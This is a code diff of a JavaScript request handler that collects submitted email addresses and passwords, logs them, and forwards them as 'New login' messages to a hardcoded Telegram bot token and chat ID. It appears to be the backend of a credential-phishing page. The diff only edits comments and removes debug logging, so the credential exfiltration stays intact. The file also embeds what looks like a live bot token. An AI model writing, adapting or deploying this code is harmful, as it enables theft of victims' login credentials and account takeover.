@@ -13,23 +13,17 @@ export default async function handler(req, res) {
         // Log received credentials
         console.log('Received credentials:', { email, password });
 
-        // New Telegram bot token and chat ID
-        const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc'; // Replace with your new bot token
-        const chatId = '7329638940'; // Replace with your actual chat ID
+        // Telegram bot token and chat ID
+        const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc'; // Replace with your bot token
+        const chatId = '7329638940'; // Replace with your chat ID
 
         // Construct the message for Telegram
         const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-        // Log the Telegram API request
-        console.log('Sending message to Telegram:', telegramUrl);
-
         // Send the message to Telegram
         const response = await fetch(telegramUrl);
         const result = await response.json();
-
-        // Log the Telegram API response
-        console.log('Telegram API response:', result);
 
         // Check if the Telegram API request was successful
         if (!response.ok) {
